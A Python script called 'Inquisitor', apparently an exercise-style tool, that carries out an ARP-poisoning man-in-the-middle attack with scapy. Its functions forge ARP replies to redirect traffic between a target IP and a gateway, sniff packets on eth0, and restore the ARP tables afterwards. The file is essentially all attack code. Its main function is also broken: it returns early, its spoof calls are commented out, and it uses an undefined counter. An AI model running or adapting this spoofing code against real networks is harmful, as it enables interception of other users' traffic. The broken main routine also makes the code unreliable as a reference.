import argparse
import time
import scapy.all as scapy
from scapy.layers import inet

def optparsing() -> None:
    """
    parsing shell option arguments to program
    """
    parser = argparse.ArgumentParser(prog="Inquisitor", description="ARP poisoning in the middle attack")
    parser.add_argument("files", nargs="*")
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        dest='target_ip',
        help="IP address of the target."
    )
    parser.add_argument(
        "-g",
        "--gateway",
        required=True,
        dest='gateway_ip',
        help="IP address of Gateway"
    )
    return parser.parse_args()


def get_mac(ip: str):
    arp_req_frame = scapy.ARP(pdst=ip)
    broadcast_ether_frame = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
    for answer in answered_list:
        print(answer)
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(spoof_packet, verbose = False)

def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)

def sniffer():
    scapy.sniff(iface='eth0', store = False, prn = process_packet)

def process_packet(packet):
    print('packet:', packet)

def poison(src_ip, dest_ip):
    spoof(src_ip, dest_ip)
    spoof(dest_ip, src_ip)

def esuna(src_ip, dest_ip):
    restore(src_ip, dest_ip)
    restore(dest_ip, src_ip)

def main():
    args = optparsing()
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip
    # packets_sent = 0
    return
    try:
        while True:
            # spoof(target_ip, gateway_ip)
            # spoof(gateway_ip, target_ip)
            packets_sent += 2

            print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
            # packet = scapy.sniff(target_ip)
            # print('Packet:', packet)
            sniffer()
            break
            time.sleep(2)
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
    except KeyboardInterrupt:
        print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
